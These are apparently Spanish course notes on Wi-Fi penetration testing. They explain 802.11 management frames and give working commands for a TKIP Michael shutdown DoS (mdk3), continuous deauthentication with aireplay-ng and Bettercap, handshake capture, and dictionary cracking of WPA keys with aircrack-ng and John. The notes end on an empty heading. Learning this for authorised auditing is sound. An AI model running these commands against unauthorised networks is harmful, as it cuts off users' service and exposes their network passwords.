El ataque Michael Shutdown Exploitation es una vulnerabilidad que afecta al protocolo **TKIP** (Temporal Key Integrity Protocol), utilizado principalmente en redes Wi-Fi protegidas con **WPA** (Wi-Fi Protected Access) de primera generación. TKIP fue diseñado como una mejora de seguridad para WEP, pero se descubrió que era vulnerable a ciertos ataques criptográficos. El ataque Michael explota una debilidad en el algoritmo de integridad de mensajes (MIC) de TKIP. Si se detectan dos fallos de integridad de mensajes en un corto período de tiempo, el protocolo WPA está diseñado para activar un "apagado" o "cierre" de la red (Michael Shutdown) para evitar ataques de inyección de paquetes, lo que resulta en una denegación de servicio (DoS) al apagar el router de acceso de forma remota durante un período de tiempo (unos 60 segundos).

Este ataque no permite descifrar la clave WPA, sino que provoca una interrupción del servicio al forzar al AP a reiniciarse o a dejar de transmitir temporalmente como medida de seguridad.

### Funcionamiento y Herramientas

1. **Poner la interfaz en modo monitor**: Como en los casos anteriores, la tarjeta inalámbrica debe estar en modo monitor.
2. usamos `airodump-ng <nombTarjeta>` para seleccionar el PA a atacar
3. **Ejecutar el ataque con `mdk3`**: Se especifica la interfaz en modo monitor y el modo `m`.
    ```bash
    mdk3 MONITOR_INTERFACE m -a [MAC_AP] -c [CHANNEL]
    ```
    - `MONITOR_INTERFACE`: El nombre de la interfaz en modo monitor.
    - `m`: Activa el modo Michael shutdown exploitation.
    - `-a [MAC_AP]` : La dirección MAC del AP objetivo.
    - `-c [CHANNEL]` (opcional): El canal en el que opera la red objetivo.

El ataque funciona inyectando paquetes con errores de integridad Michael. Cuando el AP detecta un número predefinido de estos errores (normalmente dos) en un corto intervalo, activa la contramedida de apagado para proteger la red.

### Versiones Afectadas

**Este ataque afecta a redes que utilizan el cifrado WPA con TKIP.** Las redes WPA2 y WPA3 que utilizan AES-CCMP (Advanced Encryption Standard - Counter Mode with CBC-MAC Protocol) no son vulnerables a este ataque, ya que AES es un algoritmo de cifrado más robusto y no utiliza el algoritmo Michael. 

## 17. Técnicas pasivas de explotación

### Descripción de las Técnicas Pasivas

Las técnicas pasivas de explotación en redes inalámbricas se refieren a métodos de recolección de información que no implican la inyección de paquetes en la red ni la interacción directa con los dispositivos. El objetivo principal es escuchar y analizar el tráfico de la red sin ser detectado, obteniendo datos valiosos que pueden ser utilizados posteriormente para ataques activos o para comprender la estructura y el comportamiento de la red. Estas técnicas son "silenciosas" y no generan alertas en los sistemas de detección de intrusiones, lo que las hace muy útiles para la fase de reconocimiento.


## 18. Instalación compilación y validación del HandShake con Pyrit (NO FUNCIONA)

### Descripción de Pyrit

Pyrit es una herramienta diseñada para averiguar si han sido capturados handshakes y para crear bases de datos masivas de PMKs (Pairwise Master Keys) precalculadas para la fase de autenticación WPA/WPA2-PSK. Su principal ventaja es que aprovecha la potencia computacional de CPUs multinúcleo y GPUs para acelerar significativamente el proceso de cracking de contraseñas. En lugar de calcular el PMK para cada contraseña en tiempo real durante un ataque de fuerza bruta, Pyrit precalcula y almacena estos PMKs, lo que permite un ataque mucho más rápido una vez que se ha capturado un handshake.

### Instalación y Compilación

1. **Clonar el repositorio**: `git clone https://github.com/JPaulMora/Pyrit.git`
2. **Instalar dependencias**: Pyrit requiere varias librerías, incluyendo OpenSSL, libpcap, y las SDKs para CUDA/OpenCL si se desea usar aceleración por GPU.
3. **Compilar**: Navegar al directorio de Pyrit y ejecutar el comando de compilación (ej. `python setup.py build` o `make` ).
4. **Instalar**: `sudo python setup.py install`.

# 19. Análisis de los paquetes Probe Request

### Descripción de los Paquetes Probe Request

Los paquetes Probe Request (solicitud de sondeo) son un tipo de trama de gestión en redes inalámbricas. Son enviados por los clientes (dispositivos como teléfonos, laptops, etc.) para descubrir redes Wi-Fi disponibles en su entorno. A diferencia de las tramas beacon (que son enviadas por los APs para anunciar su presencia), los Probe Requests son iniciados por el cliente.

Existen dos tipos principales de Probe Requests:

1. **Probe Request con SSID específico**: El cliente envía una solicitud buscando un SSID particular (el nombre de una red a la que se ha conectado previamente o que tiene en su lista de redes preferidas). Esta es una forma de escaneo activo.
2. **Probe Request con SSID nulo (broadcast)**: El cliente envía una solicitud genérica para descubrir cualquier red disponible, sin especificar un SSID. Esto es común cuando el cliente busca redes nuevas o cuando el SSID de una red conocida no está siendo transmitido por el AP.

### Información Contenida y su Explotación

Los paquetes Probe Request no están cifrados y contienen información valiosa que puede ser explotada por un atacante:

- **SSID (en claro)**: Si el cliente busca un SSID específico, este se transmite en texto plano. Esto significa que un atacante puede ver los nombres de todas las redes a las que un dispositivo se ha conectado en el pasado, incluso si esas redes no están actualmente en el rango o tienen su SSID oculto.
- **Dirección MAC del cliente**: La dirección MAC del dispositivo que envía el Probe Request también se transmite en claro. Esto permite al atacante identificar y rastrear dispositivos individuales. Aunque la "MAC randomization" (aleatorización de MAC) se ha implementado en muchos dispositivos modernos para mitigar esto, no siempre es completamente efectiva.
- **Fabricante del dispositivo**: La primera parte de la dirección MAC (OUI - Organizationally Unique Identifier) puede revelar el fabricante del dispositivo, lo que puede dar pistas sobre el tipo de dispositivo o sistema operativo.
### Herramienta para el Análisis
**Wireshark**: Ofrece un análisis detallado de los paquetes, permitiendo aplicar filtros específicos (`wlan.fc.type_subtype == 0x04` para Probe Requests) para examinar su contenido

## 20. Análisis de los paquetes Probe Response

### Descripción de los Paquetes Probe Response

Los paquetes Probe Response (respuesta de sondeo) son tramas de gestión en redes inalámbricas que son enviadas por un punto de acceso (AP) en respuesta a un paquete Probe Request recibido de un cliente. Cuando un cliente envía un Probe Request (ya sea buscando un SSID específico o un SSID nulo), cualquier AP que reciba esa solicitud y que pueda satisfacerla (es decir, que tenga el SSID solicitado o que esté dispuesto a responder a una solicitud genérica) enviará un Probe Response.

### Información Contenida y su Explotación

Al igual que los Probe Requests, los paquetes Probe Response no están cifrados y contienen información crucial sobre el punto de acceso y la red:

- **SSID (nombre de red)**: El nombre de la red que el AP está anunciando.
- **BSSID (dirección MAC del AP)**: La dirección MAC del punto de acceso.
- **Canal de operación**: El canal en el que opera el AP.
- **Capacidades de seguridad**: Información sobre el tipo de cifrado y autenticación soportados por el AP (WEP, WPA, WPA2, WPA3, TKIP, AES, etc.).
- **Tasas de transmisión soportadas**: Las velocidades de datos que el AP puede manejar.
- **Otros parámetros de red**: Como el intervalo de baliza, capacidades de QoS, etc.

La explotación de los Probe Responses se realiza mediante la **escucha pasiva** y el análisis de estos paquetes. Un atacante puede:

- **Mapear la red**: Obtener una visión completa de los APs presentes en el entorno, sus SSIDs, BSSIDs, canales y configuraciones de seguridad. Esto es fundamental para la fase de reconocimiento.
- **Identificar vulnerabilidades**: Al conocer el tipo de cifrado y las capacidades de seguridad, el atacante puede identificar redes que utilizan protocolos más débiles (como WEP o WPA/TKIP) que son más fáciles de explotar.
- **Preparar ataques dirigidos**: La información obtenida de los Probe Responses permite al atacante configurar sus herramientas para ataques específicos (ej. un ataque de desautenticación contra un AP particular o un ataque de fuerza bruta contra una red WPA2).
- **Detectar APs falsos (Rogue APs)**: Analizando los Probe Responses, se pueden identificar APs que no deberían estar presentes en la red o que tienen configuraciones sospechosas.
### Herramienta para el Análisis
**Wireshark**: Permite un análisis profundo de los paquetes Probe Response, aplicando filtros específicos (`wlan.fc.type_subtype == 0x05` para Probe Responses) para inspeccionar todos sus campos.

## 21. Análisis de los paquetes Association Request

### Descripción de los Paquetes Association Request

Los paquetes Association Request (solicitud de asociación) son tramas de gestión fundamentales en el proceso de conexión de un cliente a una red Wi-Fi. Después de que un cliente ha descubierto un punto de acceso (AP) a través de tramas Beacon o Probe Response, y ha completado la fase de autenticación (que puede ser abierta o compartida), envía un paquete Association Request al AP para solicitar formalmente unirse a la red. Este paquete contiene información crucial sobre las capacidades del cliente.

### Información Contenida y su Explotación

Los paquetes Association Request, aunque no suelen ser directamente explotables para un ataque de denegación de servicio o acceso no autorizado, son valiosos en la fase de reconocimiento pasivo. Contienen información en texto claro que puede ser analizada por un atacante:

•Dirección MAC del cliente: Identifica de forma única el dispositivo que intenta asociarse.
•SSID al que se intenta asociar: El nombre de la red a la que el cliente desea unirse.
•Capacidades soportadas por el cliente: Incluye las tasas de transmisión de datos (data rates) que el cliente puede manejar, los estándares 802.11 soportados (a/b/g/n/ac/ax), y las capacidades de seguridad (cifrado y autenticación) que el cliente prefiere o soporta.

La explotación de esta información se centra en:
•Mapeo de la red: Permite al atacante identificar qué clientes se están conectando a qué APs, y qué tipo de dispositivos son (por sus capacidades y dirección MAC).
•Identificación de vulnerabilidades: Al conocer las capacidades de seguridad del cliente, un atacante puede inferir si el cliente es compatible con protocolos de seguridad más débiles (aunque esto es menos común hoy en día con WPA2/WPA3).
•Preparación de ataques dirigidos: La información sobre las tasas de transmisión y estándares soportados puede ser útil para optimizar ataques de denegación de servicio o para configurar un AP falso que sea compatible con el cliente objetivo.

### Herramienta para el Análisis

Wireshark: Es la herramienta principal para analizar estos paquetes. Se puede aplicar un filtro como wlan.fc.type_subtype == 0x00 (o wlan.fc.type == 0 && wlan.fc.subtype == 0) para capturar solo las tramas Association Request. Wireshark permite inspeccionar todos los campos de la trama para extraer la información mencionada

## 22. Análisis de los paquetes Association Response

### Descripción de los Paquetes Association Response

Los paquetes Association Response (respuesta de asociación) son tramas de gestión enviadas por un punto de acceso (AP) en respuesta a un paquete Association Request de un cliente. Este paquete es la confirmación del AP de que ha aceptado la solicitud del cliente para unirse a la red. Si la asociación es exitosa, el cliente puede comenzar a enviar y recibir tráfico de datos a través del AP. Si la asociación es rechazada, el paquete Association Response incluirá un código de estado que indica la razón del rechazo.

### Información Contenida y su Explotación

Los paquetes Association Response son cruciales para entender el estado de la conexión entre un cliente y un AP. Al igual que otras tramas de gestión, no están cifrados y pueden ser analizados pasivamente para obtener información valiosa:

•Dirección MAC del AP y del cliente: Confirma la identidad de ambos dispositivos en la asociación.
•Código de estado: Indica si la asociación fue exitosa o no, y en caso de fallo, la razón (ej. autenticación fallida, capacidades no soportadas, etc.).
•Capacidades soportadas por el AP: Incluye las tasas de transmisión de datos, los estándares 802.11 soportados, y las capacidades de seguridad que el AP ha negociado con el cliente.
•AID (Association ID): Un identificador único asignado al cliente por el AP para esa sesión de asociación.

La explotación de esta información se centra en:
•Diagnóstico de problemas de conexión: Un atacante puede monitorear los Association Responses para identificar problemas en la red, como clientes que no pueden asociarse o APs que rechazan asociaciones.
•Mapeo de la red: Complementa la información obtenida de los Association Requests, proporcionando una imagen más completa de las asociaciones activas en la red.
•Identificación de configuraciones de seguridad: Al observar las capacidades de seguridad anunciadas por el AP en el Association Response, un atacante puede confirmar los protocolos de cifrado y autenticación en uso.

### Herramientas para el Análisis

•Wireshark: Permite un análisis detallado de los paquetes Association Response. Se puede usar un filtro como wlan.fc.type_subtype == 0x01 (o wlan.fc.type == 0 && wlan.fc.subtype == 1) para capturar estas tramas. La inspección de los campos de la trama, especialmente el código de estado, es fundamental.


## 23. Análisis de paquetes Beacon

### Descripción de los Paquetes Beacon

Los paquetes Beacon son tramas de gestión fundamentales en redes inalámbricas 802.11. Son enviados periódicamente por los puntos de acceso (APs) para anunciar su presencia y las características de la red que ofrecen. Permite a los clientes inalámbricos descubrir redes disponibles de forma pasiva, sin necesidad de enviar ninguna solicitud. Cada AP transmite tramas Beacon a intervalos regulares (generalmente cada 100 milisegundos).

### Información Contenida y su Explotación

Los paquetes Beacon no están cifrados y contienen una gran cantidad de información sobre la red, lo que los convierte en una fuente rica para el reconocimiento pasivo por parte de un atacante:

•SSID (Service Set Identifier): El nombre de la red Wi-Fi. Si el SSID está oculto, el campo correspondiente estará vacío o contendrá un valor nulo, pero el AP seguirá enviando Beacons.
•BSSID (Basic Service Set Identifier): La dirección MAC del punto de acceso, que identifica de forma única al AP.
•Canal de operación: El canal de frecuencia en el que opera la red.
•Capacidades de seguridad: Información sobre el tipo de cifrado y autenticación utilizados por la red (WEP, WPA, WPA2, WPA3, TKIP, AES, etc.). Esto es crucial para que un atacante determine la robustez de la seguridad de la red.
•Tasas de transmisión soportadas: Las velocidades de datos que el AP puede manejar.
•Intervalo de baliza: La frecuencia con la que el AP envía las tramas Beacon.
•Timestamp: Un valor de tiempo que permite a los clientes sincronizarse con el AP.
•Information Elements (IEs): Campos adicionales que pueden contener información variada, como el país de operación, soporte para QoS, etc.

La explotación de los paquetes Beacon se centra en:

•Mapeo de la red: Permite al atacante construir un mapa completo de todas las redes Wi-Fi visibles en un área, incluyendo sus nombres, direcciones MAC, canales y configuraciones de seguridad.
•Identificación de redes objetivo: Facilita la selección de redes con seguridad más débil o con configuraciones interesantes para ataques posteriores.
•Detección de APs falsos (Rogue APs): Al analizar los Beacons, se pueden identificar APs que no deberían estar presentes o que tienen configuraciones sospechosas (ej. un AP con un SSID conocido pero con una MAC diferente).
•Análisis de la congestión del canal: El número de Beacons en un canal puede indicar el nivel de actividad y congestión, lo que es útil para planificar ataques de denegación de servicio.

### Herramientas para el Análisis

•airodump-ng: Es la herramienta por excelencia para capturar y mostrar información de los paquetes Beacon. Muestra el BSSID, ESSID, canal, tipo de cifrado, y el número de Beacons capturados.

•Wireshark: Permite un análisis profundo de los paquetes Beacon. Se puede usar un filtro como wlan.fc.type_subtype == 0x08 (o wlan.fc.type == 0 && wlan.fc.subtype == 8) para capturar estas tramas y examinar todos sus campos detalladamente. Para observar los campos, se puede usar la opción `-Tjson`

## 24. Análisis de paquetes de Autenticación

### Descripción de los Paquetes de Autenticación

Los paquetes de Autenticación son tramas de gestión en redes inalámbricas 802.11 que inician el proceso de conexión entre un cliente y un punto de acceso (AP). Antes de que un cliente pueda asociarse a una red y comenzar a enviar/recibir datos, debe autenticarse con el AP. Existen dos tipos principales:

1.Open System Authentication (Sistema Abierto): Es el método más simple y común. El cliente envía un paquete de autenticación al AP, y el AP responde con un paquete de autenticación exitosa. No hay intercambio de credenciales en esta fase; la autenticación es meramente una formalidad. La seguridad real se establece en la fase de asociación y cifrado (WEP, WPA, WPA2, WPA3).

2.Shared Key Authentication (Clave Compartida): Utilizado principalmente con WEP. El AP envía un texto de desafío al cliente, el cliente lo cifra con la clave WEP y lo envía de vuelta al AP. El AP descifra el texto y verifica si coincide con el original. Este método es vulnerable y rara vez se usa hoy en día.

### Información Contenida y su Explotación

Los paquetes de Autenticación, al ser tramas de gestión, no están cifrados y pueden ser interceptados y analizados pasivamente. La información que contienen es valiosa para el reconocimiento:

•Dirección MAC del cliente y del AP: Identifica a los participantes en el proceso de autenticación.
•Algoritmo de autenticación: Indica si se está utilizando Open System o Shared Key.
•Código de estado: En el paquete de respuesta, indica si la autenticación fue exitosa o fallida y la razón.

La explotación de estos paquetes se centra en:

•Identificación de redes WEP: Si se observa Shared Key Authentication, es un claro indicio de que la red utiliza WEP, un protocolo de seguridad obsoleto y vulnerable.
•Detección de intentos de conexión: Permite al atacante ver qué clientes están intentando conectarse a qué redes.
•Ataques de falsa autenticación: Como se vio en el Video 11, un atacante puede enviar paquetes de autenticación falsos para engañar al AP y obtener una asociación, lo que es útil para otros ataques.
•Análisis de fallos de autenticación: Si un cliente falla repetidamente en la autenticación, puede indicar problemas de configuración o intentos de acceso no autorizados.

### Herramientas para el Análisis

•Wireshark: Permite capturar y analizar los paquetes de Autenticación. Se puede usar un filtro como wlan.fc.type_subtype == 0x0b (o wlan.fc.type == 0 && wlan.fc.subtype == 11) para las solicitudes de autenticación y wlan.fc.type_subtype == 0x0b para las respuestas. La inspección de los campos de la trama revelará el algoritmo y el estado.

## 25. Análisis de paquetes de Deautenticación

### Descripción de los Paquetes de Deautenticación

Los paquetes de Deautenticación son tramas de gestión en redes inalámbricas 802.11 que se utilizan para desconectar un cliente de un punto de acceso (AP) o viceversa. Son una parte legítima del protocolo Wi-Fi, permitiendo que un dispositivo termine su conexión de forma controlada. Sin embargo, estos paquetes son la base de uno de los ataques de denegación de servicio (DoS) más comunes y efectivos en redes Wi-Fi: el ataque de desautenticación.

### Información Contenida y su Explotación

Los paquetes de Deautenticación no están cifrados y contienen la siguiente información:

•Dirección MAC del remitente y del receptor: Identifica al AP y al cliente involucrados en la desconexión.
•Razón de la desconexión: Un código que indica el motivo por el cual se está enviando el paquete de desautenticación (ej. cliente inactivo, AP sobrecargado, etc.)

La explotación de estos paquetes se realiza principalmente a través del ataque de desautenticación:

•Denegación de Servicio (DoS): Un atacante puede falsificar paquetes de desautenticación y enviarlos desde la dirección MAC del AP al cliente, o desde la dirección MAC del cliente al AP. Esto hace que el cliente se desconecte de la red. Si se envían continuamente, el cliente no podrá mantener una conexión estable, lo que resulta en una denegación de servicio.
•Captura de Handshake: El ataque de desautenticación es una técnica común para forzar a un cliente a reconectarse a la red. Durante esta reconexión, se produce el 4-way handshake de WPA/WPA2, que es esencial para el cracking de contraseñas. Al desconectar a un cliente legítimo, el atacante puede capturar este handshake y luego intentar descifrar la contraseña de la red offline.
•Ataques Man-in-the-Middle (MitM): Al desconectar a un cliente de su AP legítimo, un atacante puede intentar que el cliente se conecte a un AP falso controlado por el atacante, facilitando un ataque MitM.

### Herramientas para el Análisis y Ejecución

•aireplay-ng: Parte de la suite Aircrack-ng, es la herramienta más utilizada para ejecutar ataques de desautenticación. 

•mdk3 / mdk4: También pueden realizar ataques de desautenticación en modo "Amok" (Video 15).

•Wireshark: Permite capturar y analizar los paquetes de Deautenticación. Se puede usar un filtro como wlan.fc.type_subtype == 0x0c (o wlan.fc.type == 0 && wlan.fc.subtype == 12) para inspeccionar estos paquetes y verificar su origen y destino

## 26. Análisis de paquetes de Desasociación

### Descripción de los Paquetes de Desasociación
Los paquetes de Desasociación son tramas de gestión en redes inalámbricas 802.11 que se utilizan para finalizar la conexión de un cliente con un punto de acceso (AP) de forma controlada. A diferencia de los paquetes de desautenticación (que terminan la autenticación y la asociación), los paquetes de desasociación solo terminan la asociación, manteniendo la autenticación. Esto significa que el cliente aún está autenticado con el AP, pero ya no está asociado y no puede enviar ni recibir tráfico de datos. Son una parte legítima del protocolo Wi-Fi, pero también pueden ser explotados para ataques de denegación de servicio (DoS).

### Información Contenida y su Explotación
Los paquetes de Desasociación no están cifrados y contienen la siguiente información:

-   **Dirección MAC del remitente y del receptor**: Identifica al AP y al cliente involucrados en la desconexión.
-   **Razón de la desconexión**: Un código que indica el motivo por el cual se está enviando el paquete de desasociación (ej. cliente inactivo, AP sobrecargado, etc.).

La explotación de estos paquetes se realiza principalmente a través del **ataque de desasociación**:

-   **Denegación de Servicio (DoS)**: Un atacante puede falsificar paquetes de desasociación y enviarlos desde la dirección MAC del AP al cliente, o desde la dirección MAC del cliente al AP. Esto hace que el cliente se desconecte de la red. Si se envían continuamente, el cliente no podrá mantener una conexión estable, lo que resulta en una denegación de servicio.
-   **Captura de Handshake**: Al igual que con los ataques de desautenticación, los ataques de desasociación pueden forzar a un cliente a reconectarse a la red, lo que puede ser aprovechado para capturar el 4-way handshake de WPA/WPA2 y posteriormente intentar crackear la contraseña.
-   **Ataques Man-in-the-Middle (MitM)**: Al desconectar a un cliente de su AP legítimo, un atacante puede intentar que el cliente se conecte a un AP falso controlado por el atacante, facilitando un ataque MitM.

### Herramientas para el Análisis y Ejecución
-   **`aireplay-ng`**: Parte de la suite Aircrack-ng, puede ser utilizada para enviar paquetes de desasociación.
-   **`mdk3` / `mdk4`**: También pueden realizar ataques de desasociación en modo "Amok".
-   **Wireshark**: Permite capturar y analizar los paquetes de Desasociación. Se puede usar un filtro como `wlan.fc.type_subtype == 0x0a` (o `wlan.fc.type == 0 && wlan.fc.subtype == 10`) para inspeccionar estos paquetes y verificar su origen y destino.

## 27. Extracción del Hash en el HandShake con Aircrack

### Descripción de la Extracción del Hash (Handshake)
La extracción del hash en el handshake es un paso crucial en el proceso de cracking de contraseñas WPA/WPA2-PSK. El "hash" al que se refiere el video es, en realidad, el Pairwise Master Key (PMK) o el Pairwise Transient Key (PTK) derivado durante el 4-way handshake. Para crackear la contraseña de una red WPA/WPA2, no se necesita la contraseña en sí, sino una captura completa de este handshake, que contiene la información necesaria para realizar un ataque de fuerza bruta o diccionario offline.

### Funcionamiento y Herramientas (`airodump-ng` y `aireplay-ng`)
El proceso de extracción del handshake generalmente implica:

1.  **Poner la interfaz en modo monitor**: La tarjeta inalámbrica debe estar en modo monitor para poder capturar todo el tráfico de la red.
    ```bash
    airmon-ng start [INTERFACE]
    ```
2.  **Capturar el tráfico con `airodump-ng`**: Se utiliza `airodump-ng` para escanear la red, identificar el AP objetivo y los clientes conectados, y capturar el handshake. Es fundamental que un cliente se conecte o reconecte a la red para que se genere el handshake.
    ```bash
    airodump-ng -c [CANAL] --bssid [MAC_AP] -w [NOMBRE_ARCHIVO] [INTERFACE_MONITOR]
    ```
    - `-c [CANAL]`: El canal en el que opera el AP objetivo.
    - `--bssid [MAC_AP]`: La dirección MAC del AP objetivo.
    - `-w [NOMBRE_ARCHIVO]`: Prefijo para el archivo de captura (ej. `captura_wpa`). Esto creará archivos `.cap`, `.csv`, etc.
    - `[INTERFACE_MONITOR]`: La interfaz inalámbrica en modo monitor.

3.  **Forzar la desconexión de un cliente. Esto forzará al cliente a reconectarse, generando un nuevo handshake que `airodump-ng` capturará.
    ```bash
    aireplay-ng --deauth 0 -a [MAC_AP] -c [MAC_CLIENTE] [INTERFACE_MONITOR]
    ```
    - `--deauth 0`: Envía paquetes de desautenticación continuamente (0 significa ilimitado).
    - `-a [MAC_AP]`: Dirección MAC del AP objetivo.
    - `-c [MAC_CLIENTE]`: Dirección MAC de un cliente conectado al AP.

Una vez que `airodump-ng` detecta y captura el handshake, aparecerá un mensaje como "WPA handshake: [MAC_AP]" en la parte superior derecha de la pantalla. El handshake se guardará en el archivo `.cap` generado.

### Verificación del Handshake
Es crucial verificar que el handshake capturado sea válido antes de intentar crackearlo. Esto se puede hacer con `aircrack-ng` o `pyrit`:

```bash
aircrack-ng [NOMBRE_ARCHIVO].cap
```

Si el handshake es válido, `aircrack-ng` lo reconocerá y estará listo para un ataque de diccionario. Si no es válido, se deberá intentar capturar otro handshake.

## 28. Fuerza bruta con John para obtener la contraseña de la red

### Funcionamiento y Uso para WPA/WPA2
Para utilizar John the Ripper en el cracking de contraseñas WPA/WPA2-PSK, se necesita:

1.  **Un handshake capturado**: El archivo `.cap` obtenido con `airodump-ng` (Video 27) que contenga un handshake WPA/WPA2 válido.
2.  **Un diccionario**: Cuanto más grande y relevante sea el diccionario, mayores serán las posibilidades de éxito.

El proceso implica:

1.  **Convertir el archivo `.cap` a un formato compatible con JtR**: John the Ripper no puede procesar directamente los archivos `.cap`. Se necesita una herramienta como:
	- `aircrack-ng -J`
	- `wpapsk2john`

    ```bash
    aircrack-ng [NOMBRE_ARCHIVO].cap -J [NOMBRE_HASH]
    # Esto creará un archivo [NOMBRE_HASH].hccap
    ```

    ```bash
    wpapsk2john [NOMBRE_ARCHIVO].cap > [NOMBRE_HASH].hash
    ```

2. Si el documento está en formato .hccap
```bash
hccap2john [NOMBRE_HASH].hccap > miHash
```

3.  **Ejecutar John the Ripper con el hash y el diccionario**: Una vez que se tiene el hash en el formato correcto, se puede ejecutar JtR en modo de diccionario.
    ```bash
    john --wordlist=[RUTA_DICCIONARIO] [NOMBRE_HASH].hash
    ```

### Consideraciones y Limitaciones
-   **Dependencia del diccionario**: El éxito de un ataque de diccionario depende completamente de la calidad y exhaustividad de la lista de palabras. Si la contraseña no está en el diccionario, JtR no la encontrará.
-   **Rendimiento**: El cracking de WPA/WPA2 es computacionalmente intensivo. El rendimiento de JtR puede mejorarse utilizando CPUs potentes o, idealmente, GPUs (aunque para esto se suelen usar herramientas como Hashcat, que están optimizadas para GPU).
-   **Salting (SSID como salt)**: WPA/WPA2 utiliza el SSID de la red como un "salt" en el proceso de derivación de la clave. Esto significa que las rainbow tables genéricas no son efectivas para WPA/WPA2, y las tablas deben ser generadas específicamente para cada SSID, lo que aumenta la complejidad y el tiempo de precomputación.


## 29. Fuerza bruta con Aircrack para obtener la contraseña de la red

Para realizar un ataque de fuerza bruta (diccionario) con Aircrack-ng, se necesitan dos elementos clave:

1.  **Un handshake WPA/WPA2 capturado**: Un archivo `.cap` que contenga el 4-way handshake de la red objetivo (obtenido en el Video 27).
2.  **Una lista de palabras (diccionario)**: Un archivo de texto con posibles contraseñas. La efectividad del ataque depende directamente de la calidad y el tamaño de este diccionario.

El comando básico para ejecutar Aircrack-ng es:

```bash
aircrack-ng -w [RUTA_DICCIONARIO] [ARCHIVO_HANDSHAKE].cap
```
donde:
`ARCHIVO_HANDSHAKE].cap` es la captura de la red objetivo. No es únicamente el handshake. 

**Proceso de Aircrack-ng:**

1.  Aircrack-ng leerá el archivo `.cap` y buscará handshakes válidos.
2.  Una vez que encuentra un handshake, tomará cada palabra del diccionario, la combinará con el SSID de la red (que actúa como salt) y realizará las operaciones criptográficas necesarias para derivar el PMK (Pairwise Master Key).
3.  Comparará el PMK calculado con el PMK contenido en el handshake capturado.
4.  Si hay una coincidencia, la palabra del diccionario es la contraseña correcta, y Aircrack-ng la mostrará.

### Consideraciones y Optimización
-   **Rendimiento**: El cracking de WPA/WPA2 es un proceso que consume muchos recursos de CPU. Para contraseñas largas o complejas, puede llevar mucho tiempo o ser inviable con solo CPU.
-   **Diccionarios**: Es fundamental utilizar diccionarios grandes y específicos. Se pueden encontrar diccionarios preexistentes en línea (ej. `rockyou.txt`) o crear diccionarios personalizados basados en información sobre el objetivo (ej. nombres de empresas, fechas, etc.).
-   **Aceleración por GPU**: Herramientas como Hashcat están mucho más optimizadas para aprovechar la potencia de las GPUs, lo que puede acelerar drásticamente el proceso de cracking.


## 30. Proceso de ataque con Bettercap

### Descripción de Bettercap
Bettercap es una herramienta de código abierto, potente y versátil, diseñada para realizar ataques Man-in-the-Middle (MitM), reconocimiento de red, manipulación de tráfico y auditorías de seguridad en redes Wi-Fi, Bluetooth Low Energy (BLE) e IPv4/IPv6.

### Funcionamiento y Uso para Ataques Wi-Fi
Bettercap ofrece módulos para ataques Wi-Fi, incluyendo:

1.  **Escaneo de redes (`wifi.recon on`)**: Permite descubrir redes Wi-Fi cercanas, sus SSIDs, BSSIDs, canales y clientes conectados. Puede operar en modo pasivo o activo.
    ```bash
    sudo bettercap -iface [INTERFACE_INALAMBRICA]
    # Dentro de bettercap:
    wifi.recon on
    ```
2.  **Captura de Handshakes y PMKIDs**: Bettercap puede capturar automáticamente handshakes WPA/WPA2-PSK y PMKIDs (Pairwise Master Key Identifiers). Los PMKIDs son especialmente útiles porque no requieren que un cliente esté conectado a la red para ser capturados, lo que acelera el proceso de obtención de hashes para el cracking offline.
    ```bash
    # Dentro de bettercap:
    wifi.recon.channel [CANAL] # Opcional, para enfocar la captura
    wifi.recon.target [MAC_AP] # Opcional, para enfocar la captura
    wifi.recon on
    # Los handshakes/PMKIDs capturados se guardan automáticamente en un archivo .pcap o .pcapng
    ```
3.  **Ataques de Desautenticación (`wifi.deauth`)**: Permite desconectar clientes de una red específica, lo que es útil para forzar la captura de handshakes o para realizar ataques de denegación de servicio.
    ```bash
    # Dentro de bettercap:
    wifi.deauth [MAC_CLIENTE] # Desautentica un cliente específico
    wifi.deauth [MAC_AP] # Desautentica a todos los clientes de un AP
    ```
4.  **Ataques de Rogue AP (Punto de Acceso Malicioso)**: Bettercap puede crear puntos de acceso falsos para engañar a los clientes y que se conecten a ellos, permitiendo la intercepción de tráfico y la captura de credenciales.
5.  **Manipulación de tráfico**: Una vez que se ha establecido un ataque MitM, Bettercap puede inyectar código, modificar paquetes, realizar spoofing de DNS, etc.

## 31. Técnicas de aumento de la velocidad de cómputo (Rainbow Table)

### Descripción de las Rainbow Tables
Las Rainbow Tables son una técnica de precomputación utilizada para acelerar el proceso de cracking de contraseñas, especialmente aquellas que han sido hasheadas. Una Rainbow Table es una tabla precalculada que almacena pares de hashes y sus correspondientes contraseñas en texto plano. En lugar de calcular el hash de cada posible contraseña en tiempo real durante un ataque de fuerza bruta, una Rainbow Table permite buscar directamente el hash capturado en la tabla y, si se encuentra, obtener la contraseña original de forma casi instantánea.

### Funcionamiento y Uso en Cracking de Contraseñas
El concepto detrás de las Rainbow Tables es un compromiso entre tiempo y espacio: requieren una gran cantidad de espacio de almacenamiento (las tablas pueden ser de terabytes) pero reducen drásticamente el tiempo necesario para crackear una contraseña. El proceso general es:

1.  **Precomputación**: Se generan las tablas utilizando una función hash específica y un conjunto de caracteres. Este proceso es muy intensivo en cómputo y puede llevar mucho tiempo.
2.  **Almacenamiento**: Las tablas generadas se almacenan en disco.
3.  **Cracking**: Cuando se captura un hash, se busca ese hash en la Rainbow Table. Si se encuentra una coincidencia, la contraseña original se recupera.

### Rainbow Tables y WPA/WPA2-PSK
Para WPA/WPA2-PSK, el uso de Rainbow Tables es más complejo debido al "salting" con el SSID. El SSID de la red se utiliza como un valor de "salt" en el proceso de derivación de la clave (PMK = PBKDF2(PSK, SSID, iteraciones, longitud_clave)). Esto significa que:

-   **Las Rainbow Tables genéricas no funcionan**: Una Rainbow Table generada para un SSID no funcionará para otro SSID, incluso si la contraseña es la misma. Esto se debe a que el salt (SSID) cambia el hash final.
-   **Se requieren tablas específicas por SSID**: Para usar Rainbow Tables con WPA/WPA2, se necesitaría generar una tabla para cada SSID objetivo, lo cual es inviable para un gran número de redes. Por ejemplo, si se quiere crackear la contraseña "password" para la red "MiRed", el hash será diferente que para la red "OtraRed", aunque la contraseña sea la misma.

Debido a esta limitación, las Rainbow Tables no son la técnica principal para el cracking de WPA/WPA2-PSK. En su lugar, se prefieren los ataques de diccionario o fuerza bruta "on-the-fly" (calculando el hash en tiempo real) utilizando herramientas optimizadas para GPU como Hashcat, o herramientas que precalculan PMKs para un conjunto limitado de SSIDs y contraseñas (como Pyrit).

## 32. Cracking con Pyrit

